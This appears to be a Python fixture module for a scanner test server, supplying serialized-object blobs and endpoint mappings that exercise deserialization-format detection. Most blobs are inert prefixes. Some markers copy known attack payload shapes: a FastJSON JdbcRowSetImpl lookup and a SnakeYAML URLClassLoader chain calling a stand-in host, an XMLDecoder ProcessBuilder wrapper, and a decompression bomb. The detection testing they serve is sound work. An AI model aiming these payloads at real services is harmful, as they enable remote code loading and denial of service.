"""Deterministic serialized-object payload blobs for the guinea-pig target.

Single source of truth shared by the live server (server.py) and the host-side
validator (validate_payloads.py), so what the validator proves is byte-for-byte
what the target emits. Stdlib only (base64/gzip/zlib/random) so it imports the
same on the host and inside the container.

Nothing here is a working exploit: every blob is a short, inert BYTE-PREFIX or a
structural TEXT MARKER chosen only to trip the recon serialized_scan family
signatures (recon/serialized_scan/signatures.py). No gadget, no RCE, no real
class graph. These are detection fixtures, not weapons.

Each blob is built to satisfy the exact matcher that will see it:
  * base64 blobs decode to bytes whose offset-0 prefix is the on-the-wire
    serialization header (so scan_bytes matches) AND whose base64 text carries
    the family's base64 prefix (so scan_text matches);
  * base64 runs are long + high-entropy enough to pass the decoder's
    _looks_base64 gate (len>=16, len%4==0, Shannon entropy >= 3.5);
  * text markers are the literal structural tokens (O:<n>:", @class, <java
    version=, !!javax., phar://, __VIEWSTATE, ...).
"""

from __future__ import annotations

import base64
import gzip
import random
from urllib.parse import quote

# A fixed seed makes every filler byte-string reproducible across restarts, so
# the project can be pinned and the expected graph is stable run to run.
_RNG = random.Random(0xBADC0DE)


def _filler(n: int) -> bytes:
    return bytes(_RNG.randrange(256) for _ in range(n))


def _b64(raw: bytes) -> str:
    return base64.b64encode(raw).decode("ascii")


# --- Native Java (ObjectInputStream): AC ED 00 05, 'sr' TC_OBJECT ------------
# base64 -> rO0ABXNy... (scan_text rO0AB) ; decoded prefix AC ED 00 05 (scan_bytes)
_JAVA_RAW = b"\xac\xed\x00\x05\x73\x72\x00\x10java.util.ArrayList" + _filler(48)
JAVA_B64 = _b64(_JAVA_RAW)

# Native Java as lowercase hex of the same header (scan_text aced0005 + hex decode).
JAVA_HEX = _JAVA_RAW.hex()

# --- Python pickle -----------------------------------------------------------
# proto 4/5: 80 04 95 ... -> base64 gASV... (scan_text gASV ; scan_bytes 80 04)
_PICKLE4_RAW = b"\x80\x04\x95" + _filler(45) + b"."
PICKLE4_B64 = _b64(_PICKLE4_RAW)
# proto 2: 80 02 7d ... -> base64 gAJ9... (scan_text gAJ. ; scan_bytes 80 02)
_PICKLE2_RAW = b"\x80\x02}q\x00" + _filler(42) + b"."
PICKLE2_B64 = _b64(_PICKLE2_RAW)

# --- Ruby Marshal: 04 08 (no text signature; byte prefix only after base64) --
_RUBY_RAW = b"\x04\x08" + b"[\x07I\x22" + _filler(44)
RUBY_B64 = _b64(_RUBY_RAW)

# --- .NET BinaryFormatter: 00 01 00 00 00 FF FF FF FF ------------------------
# base64 -> AAEAAAD///// (scan_text) ; decoded prefix (scan_bytes)
_DOTNET_RAW = b"\x00\x01\x00\x00\x00\xff\xff\xff\xff\x01\x00\x00\x00" + _filler(42)
DOTNET_B64 = _b64(_DOTNET_RAW)

# --- Encoding-layer fixtures (decode-and-recurse) ----------------------------
# base64(gzip(java)) : chain base64 -> gzip -> AC ED 00 05
GZIP_JAVA_B64 = _b64(gzip.compress(b"\xac\xed\x00\x05" + _filler(200)))
# url-encode(base64(java)) : chain url -> base64 -> AC ED 00 05
URL_B64_JAVA = quote(JAVA_B64)

# Decompression-bomb safety fixture: a tiny gzip blob that would inflate past
# the 1 MiB per-value cap. The scanner must abort+flag (truncated), never expand
# it, and emit no candidate. Inner data starts with the Java header but is never
# reached because the bounded decompressor refuses the overflow.
_BOMB_INNER = b"\xac\xed\x00\x05" + b"\x00" * (3 * 1024 * 1024)
BOMB_B64 = _b64(gzip.compress(_BOMB_INNER))

# --- Structural TEXT markers (no decoding needed) ----------------------------
JACKSON_JSON = '{"@class":"java.util.HashMap","admin":true}'
FASTJSON_JSON = '{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://oast.example/x"}'
XMLDECODER_XML = '<java version="1.8.0_181" class="java.beans.XMLDecoder"><object class="java.lang.ProcessBuilder"><void index="0"></void></object></java>'
XSTREAM_ELEM = '<sorted-set><java.util.PriorityQueue serialization="custom"><default></default></java.util.PriorityQueue></sorted-set>'
XSTREAM_ATTR = '<map class="java.util.HashMap"><entry><string>k</string></entry></map>'
SNAKEYAML = '!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://oast.example/x"]]]]'
PHP_OBJECT = 'O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"role";s:4:"root";}'
PHP_ARRAY = 'a:2:{i:0;s:3:"foo";i:1;O:8:"stdClass":0:{}}'
PHAR = 'phar:///var/www/html/uploads/avatar.phar/polyglot.txt'
VIEWSTATE = '__VIEWSTATE=/wEPDwUKLTEyODU0ODEzMw9kFgICAw9kFgICAQ8PFgIeBFRleHQFA2FiY2Rk'

JAVA_CONTENT_TYPE = "application/x-java-serialized-object"
HESSIAN_CONTENT_TYPE = "application/x-hessian"


# Catalog consumed by server.py. Each entry: endpoint path -> how it emits.
#   emit kinds: "content_type" (sets CT), "cookie" (Set-Cookie name=value),
#   "header" (custom response header name:value).
# The `fmt`/`transport` fields document the expected recon classification and
# are asserted by validate_payloads.py.
ENDPOINTS = [
    # path, title, emit kind, (name, value), expected deser_format(s), transport
    ("/java/native", "Java ObjectInputStream", "content_type",
     ("Content-Type", JAVA_CONTENT_TYPE), ["native_java"], "header"),
    ("/java/native", "Java ObjectInputStream", "cookie",
     ("JSESSIONID", JAVA_B64), ["native_java"], "cookie"),
    ("/java/hessian", "Hessian (Burlap/Caucho)", "content_type",
     ("Content-Type", HESSIAN_CONTENT_TYPE), ["hessian"], "header"),
    ("/java/jackson", "Jackson default typing", "header",
     ("X-Jackson-State", JACKSON_JSON), ["jackson_json"], "header"),
    ("/java/fastjson", "FastJSON autotype", "header",
     ("X-Fastjson", FASTJSON_JSON), ["fastjson"], "header"),
    ("/java/xmldecoder", "XMLDecoder", "header",
     ("X-Xmldec", XMLDECODER_XML), ["xmldecoder"], "header"),
    ("/java/xstream-elem", "XStream (FQCN element)", "header",
     ("X-Xstream-Elem", XSTREAM_ELEM), ["xstream"], "header"),
    ("/java/xstream-attr", "XStream (class= attribute)", "header",
     ("X-Xstream-Attr", XSTREAM_ATTR), ["xstream"], "header"),
    ("/java/snakeyaml", "SnakeYAML global tag", "header",
     ("X-Yaml", SNAKEYAML), ["snakeyaml"], "header"),
    ("/java/hex", "Java stream as hex", "header",
     ("X-Hex-Blob", JAVA_HEX), ["native_java"], "header"),
    ("/php/object", "PHP serialize() object", "header",
     ("X-Php-Obj", PHP_OBJECT), ["php_serialize"], "header"),
    ("/php/array", "PHP serialize() array", "header",
     ("X-Php-Arr", PHP_ARRAY), ["php_serialize"], "header"),
    ("/php/phar", "PHP phar:// stream wrapper", "header",
     ("X-Php-Phar", PHAR), ["phar"], "header"),
    ("/python/pickle4", "Python pickle proto 4/5", "cookie",
     ("session", PICKLE4_B64), ["python_pickle"], "cookie"),
    ("/python/pickle2", "Python pickle proto 2", "header",
     ("X-Pickle2", PICKLE2_B64), ["python_pickle"], "header"),
    ("/dotnet/binaryformatter", ".NET BinaryFormatter", "header",
     ("X-Net-Bin", DOTNET_B64), ["dotnet_binaryformatter"], "header"),
    ("/dotnet/viewstate", "ASP.NET __VIEWSTATE", "header",
     ("X-AspNet-Vs", VIEWSTATE), ["viewstate"], "header"),
    ("/ruby/marshal", "Ruby Marshal", "cookie",
     ("_app_session", RUBY_B64), ["ruby_marshal"], "cookie"),
    ("/encoded/gzip-java", "base64(gzip(Java))", "cookie",
     ("gz", GZIP_JAVA_B64), ["native_java"], "cookie"),
    ("/encoded/url-b64-java", "urlencode(base64(Java))", "cookie",
     ("urlc", URL_B64_JAVA), ["native_java"], "cookie"),
    ("/encoded/bomb", "gzip decompression bomb (safety)", "cookie",
     ("bomb", BOMB_B64), [], "cookie"),  # expect NO finding, no crash
]


if __name__ == "__main__":
    for p in ENDPOINTS:
        name, val = p[3]
        print(f"{p[0]:28} {p[4]} {name}={val[:48]}{'...' if len(val) > 48 else ''}")
